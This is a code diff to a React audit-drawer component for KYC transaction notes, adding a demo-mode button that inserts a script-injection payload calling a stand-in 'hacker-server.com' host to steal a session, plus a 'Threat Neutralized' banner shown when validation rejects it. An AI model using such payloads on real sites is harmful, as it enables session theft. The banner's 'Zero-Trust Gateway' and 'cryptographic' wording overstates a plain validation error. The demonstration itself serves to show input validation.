@@ -1,10 +1,11 @@
 import { useEffect, useRef, useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
-import { X, FileText, CheckCircle, Lock, RotateCcw, Eye, EyeOff } from 'lucide-react';
+import { X, FileText, CheckCircle, Lock, RotateCcw, Eye, EyeOff, ShieldCheck } from 'lucide-react';
 import { RequireRole } from '../../auth/components/RequireRole';
 import { useAuthStore } from '../../auth/store/useAuthStore';
 import { DemoBeacon } from '../../../core/components/DemoBeacon';
+import { useDemoMode } from '../../../core/hooks/useDemoMode';
 import { useFocusTrap } from '../../../core/hooks/useFocusTrap';
 import { useDrawerHistory } from '../../../core/hooks/useDrawerHistory';
 import { auditSchema, type AuditPayload } from '../schemas/auditSchema';
@@ -21,6 +22,7 @@ interface AuditDrawerProps {
 // AuditDrawer — AODA-compliant sliding panel for KYC transaction annotation.
 // Focus Trap and History API are delegated to dedicated hooks; presentation only.
 export const AuditDrawer = ({ isOpen, onClose, transactionId, sinNumber }: AuditDrawerProps) => {
+  const { isDemoMode } = useDemoMode();
   const role = useAuthStore((state) => state.user?.role);
   const [isRevealed, setIsRevealed] = useState(false);
   const [isXRayMode, setIsXRayMode] = useState(false);
@@ -40,6 +42,8 @@ export const AuditDrawer = ({ isOpen, onClose, transactionId, sinNumber }: Audit
     register,
     handleSubmit,
     reset,
+    setValue,
+    trigger,
     formState: { errors, isSubmitting, isSubmitSuccessful },
   } = useForm<AuditPayload>({
     resolver: zodResolver(auditSchema),
@@ -100,7 +104,7 @@ export const AuditDrawer = ({ isOpen, onClose, transactionId, sinNumber }: Audit
                   isXRayMode ? 'text-emerald-500' : 'text-slate-500 hover:text-slate-300'
                 }`}
               >
-                [ X-RAY ZOD: {isXRayMode ? 'ON' : 'OFF'} ]
+                [ 👁️ Developer / Audit Mode: {isXRayMode ? 'ON' : 'OFF'} ]
               </button>
             </div>
             <button
@@ -176,25 +180,49 @@ export const AuditDrawer = ({ isOpen, onClose, transactionId, sinNumber }: Audit
                 isFrozen ? 'bg-slate-200 cursor-not-allowed opacity-70 dark:bg-slate-800' : 'bg-background'
               }`}
             />
+            <p className="text-xs text-text-muted text-right">Max 1,000 characters</p>
+            {isDemoMode && (
+              <div className="mt-2">
+                <button type="button" disabled={isFrozen} onClick={async () => { setValue('notes', "<script>fetch('http://hacker-server.com/steal-session')</script>"); await trigger('notes'); }} className="flex items-center gap-2 px-3 py-2 bg-rose-500/10 hover:bg-rose-500/20 text-rose-500 border border-rose-500/30 rounded-md text-xs font-bold transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  👾 Simulate Hacker Attack
+                </button>
+              </div>
+            )}
             {/* Intercept and visualize raw Zod validation payload to demonstrate logic layer decoupling. */}
-            {errors.notes && !isXRayMode && (
+            {isDemoMode && errors.notes && (
+              <div className="mt-2 p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg flex items-start gap-2 animate-in fade-in slide-in-from-top-1">
+                <ShieldCheck className="w-5 h-5 text-emerald-500 mt-0.5 shrink-0" />
+                <div className="flex flex-col">
+                  <span className="text-xs font-bold text-emerald-600 dark:text-emerald-400 uppercase tracking-wide">Threat Neutralized</span>
+                  <span className="text-xs text-slate-600 dark:text-slate-300 mt-1">Zero-Trust Gateway successfully blocked a malicious script attack. Your financial data is secure. (Activate Developer Mode above for logs).</span>
+                </div>
+              </div>
+            )}
+            {!isDemoMode && errors.notes && !isXRayMode && (
               <p className="text-xs text-red-500">{errors.notes.message}</p>
             )}
             {errors.notes && isXRayMode && (
-              <pre className="mt-2 p-2 rounded-md text-xs font-mono overflow-x-auto whitespace-pre-wrap bg-slate-50 border border-slate-200 text-slate-700 dark:bg-slate-900/50 dark:border-slate-800 dark:text-slate-300">
-                {/* Sanitize error payload to prevent circular DOM reference crashes during JSON serialization. */}
-                {JSON.stringify(
-                  {
-                    type: errors.notes.type,
-                    message: errors.notes.message,
-                    ref: '[DOM_NODE_REDACTED]',
-                  },
-                  null,
-                  2
-                )}
-              </pre>
+              <div className="mt-2 bg-slate-950 border border-slate-800 rounded-lg overflow-hidden animate-in fade-in zoom-in-95 duration-300">
+                <div className="flex items-center justify-between px-3 py-2 border-b border-slate-800 bg-slate-900">
+                  <span className="text-[10px] font-mono text-emerald-400 uppercase tracking-widest flex items-center gap-2">
+                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                    Live Cryptographic Payload & State Machine Log
+                  </span>
+                </div>
+                <pre className="p-3 text-xs font-mono overflow-x-auto whitespace-pre-wrap text-slate-300">
+                  {/* Sanitize error payload to prevent circular DOM reference crashes during JSON serialization. */}
+                  {JSON.stringify(
+                    {
+                      type: errors.notes.type,
+                      message: errors.notes.message,
+                      ref: '[DOM_NODE_REDACTED]',
+                    },
+                    null,
+                    2
+                  )}
+                </pre>
+              </div>
             )}
-            <p className="text-xs text-text-muted text-right">Max 1,000 characters</p>
           </div>
 
           {/* AODA aria-live region — screen readers announce submission status
